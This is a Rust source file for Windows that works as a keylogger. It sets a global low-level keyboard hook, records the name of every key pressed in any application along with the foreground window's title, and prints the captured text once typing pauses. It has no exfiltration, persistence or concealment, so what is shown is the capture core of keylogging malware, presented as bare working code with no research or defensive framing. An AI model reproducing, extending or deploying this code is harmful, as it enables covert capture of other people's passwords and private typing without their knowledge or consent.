use std::{
    os::windows::prelude::OsStringExt,
    time::{Instant, Duration},
    sync::{Arc, Mutex},
    thread,
    ffi::{OsString},
    mem::{MaybeUninit},
    ptr,
};

use lazy_static::lazy_static;

use winapi::{
    ctypes::{c_int},
    shared::{
        minwindef::{
            MAX_PATH, LPARAM, LRESULT, UINT, WPARAM
        },
    },
    um::{
        // libloaderapi::{
        //     GetModuleHandleW
        // },
        winuser::{
            HC_ACTION, WM_KEYDOWN, WM_SYSKEYDOWN, WH_KEYBOARD_LL, 
            KBDLLHOOKSTRUCT, // PKBDLLHOOKSTRUCT,
            MapVirtualKeyExW, GetKeyNameTextW,
            CallNextHookEx, GetForegroundWindow, GetWindowTextW, HOOKPROC,
            SetWindowsHookExW, UnhookWindowsHookEx, TranslateMessage, DispatchMessageW,
            GetMessageW, MSG
        },
    },
};

lazy_static! {
    static ref KEY_TIMER_START: Arc<Mutex<Option<Instant>>> = Arc::new(Mutex::new(None));
    static ref KEY_TIMER_LAST: Arc<Mutex<Option<Instant>>> = Arc::new(Mutex::new(None));
    static ref KEY_STRING: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref WINDOW_STRING: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
}

unsafe extern "system" fn hook_callback(
    code: i32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {

    if code == HC_ACTION {
        match wparam as UINT { 
            WM_KEYDOWN | WM_SYSKEYDOWN  => {
                let mut KEY_STRING_LOCAL = Arc::clone(&KEY_STRING);
                let KEYTIMERSTART = Arc::clone(&KEY_TIMER_START);
                let mut start_timer = KEYTIMERSTART.lock().unwrap();
                if start_timer.is_none() {
                    *start_timer = Some(Instant::now());
                }
                drop(start_timer);

                let hwnd = GetForegroundWindow();
                let mut title = [0u16; MAX_PATH];
                let ret = GetWindowTextW(hwnd, title.as_mut_ptr(), title.len() as c_int);

                if ret > 0 {
                    let title = String::from_utf16_lossy(&title[..ret as usize]);
                    // println!("================================");
                    let p_keyboard = lparam as *const KBDLLHOOKSTRUCT;
                    let key_code = (*p_keyboard).vkCode;
                    
                    let i_scan_code = unsafe { MapVirtualKeyExW(key_code, 0, ptr::null_mut()) };

                    // Get the name of the key
                    let mut sz_key_name = [0u16; 256];
                    let i_result = unsafe { GetKeyNameTextW((i_scan_code as i32) << 16, sz_key_name.as_mut_ptr(), sz_key_name.len() as i32) };
                    if i_result != 0 {
                        // Convert the wide-character string to a Rust string
                        let s_key_name = OsString::from_wide(&sz_key_name[..i_result as usize]).to_string_lossy().into_owned();

                        // KEY_STRING_LOCAL.lock().unwrap().push_str(&format!("<{s_key_name}||{key_code}>"));
                        KEY_STRING_LOCAL.lock().unwrap().push_str(&s_key_name);

                        // Print the name of the key
                        // println!("Key name: {s_key_name}");
                    } else {
                        // println!("Result: {i_result}");
                    }
                    
                    // println!("Key code: {key_code}");
                    // println!("Key down in window: {title}");
                    let window_str_arc = Arc::clone(&WINDOW_STRING);
                    let mut title_string = window_str_arc.lock().unwrap();
                    title_string.clear();
                    title_string.push_str(&title);
                    drop(title_string);
                    
                    // println!("================================");
                    let KEYTIMEREND = Arc::clone(&KEY_TIMER_LAST);
                    let mut end_timer = KEYTIMEREND.lock().unwrap();
                    *end_timer = Some(Instant::now());
                    drop(end_timer);
                    let t = thread::spawn(move || {
                        thread::sleep(Duration::from_secs(1));
                        let mut end_timer = KEYTIMEREND.lock().unwrap();

                        if end_timer.is_some() && Instant::now().duration_since(end_timer.unwrap()) >= Duration::from_millis(900) {
                            let mut start_timer = KEYTIMERSTART.lock().unwrap();
                            let mut update_string = KEY_STRING_LOCAL.lock().unwrap();
                            let title_string = window_str_arc.lock().unwrap();
                            
                            println!("THE RECORDED WINDOW: {}", title_string);
                            println!("THE RECORDED STRING: {}", update_string);
                            update_string.clear();
                            *start_timer = None;
                            *end_timer = None;
                            
                        };
                    });
                }
            },
            _ => (),
        }
    }

    CallNextHookEx(ptr::null_mut(), code, wparam, lparam)
}

fn main() {
    // let hinstance = unsafe { GetModuleHandleW(ptr::null()) };
    let hook_callback: HOOKPROC = Some(hook_callback);
    let hook = unsafe {
        SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_callback,
            ptr::null_mut(), // hinstance
            0,
        )
    };

    if hook.is_null() {
        panic!("Failed to set keyboard hook");
    }

    let mut msg = MaybeUninit::<MSG>::uninit();

    loop {
        unsafe {
            let ret = GetMessageW(msg.as_mut_ptr(), ptr::null_mut(), 0, 0);

            if ret == 0 {
                break;
            } else if ret == -1 {
                panic!("GetMessageW failed");
            } else {
                TranslateMessage(msg.as_ptr());
                DispatchMessageW(msg.as_ptr());
            }
        }

    }
    
    unsafe {
        UnhookWindowsHookEx(hook);
    }
}

